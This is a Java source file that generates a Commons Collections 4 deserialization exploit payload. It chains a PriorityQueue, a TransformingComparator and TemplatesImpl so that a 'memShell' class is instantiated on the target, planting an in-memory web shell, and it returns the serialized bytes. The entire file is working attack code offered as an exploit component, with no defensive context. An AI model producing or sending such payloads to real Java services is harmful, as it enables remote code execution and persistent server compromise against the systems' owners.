package sample.exploit.payload;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.CannotCompileException;
import javassist.NotFoundException;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import sample.utils.ExpUtils;

import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.PriorityQueue;

public class CC4Exp {
    public String memShell;
    public Class<?> memShellRunner;

    public CC4Exp(String memShell){
        this.memShell = memShell;
        this.memShellRunner = ExpUtils.getMemShellRunner(memShell);
    }

    public byte[] exploit() throws NotFoundException, ClassNotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException {
        TemplatesImpl ti = ExpUtils.getTemplatesImpl(memShell, memShellRunner);
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{ti})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator comparator = new TransformingComparator(chainedTransformer);
        PriorityQueue priorityQueue = new PriorityQueue(2);
        priorityQueue.add(1);
        priorityQueue.add(1);
        Object[] objects = new Object[]{ti, ti};
        ExpUtils.setField(priorityQueue, "queue", objects);
        ExpUtils.setField(priorityQueue, "comparator", comparator);
        ByteArrayOutputStream bas = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bas);
        oos.writeObject(priorityQueue);
        oos.flush();
        oos.close();
        return bas.toByteArray();
    }
}
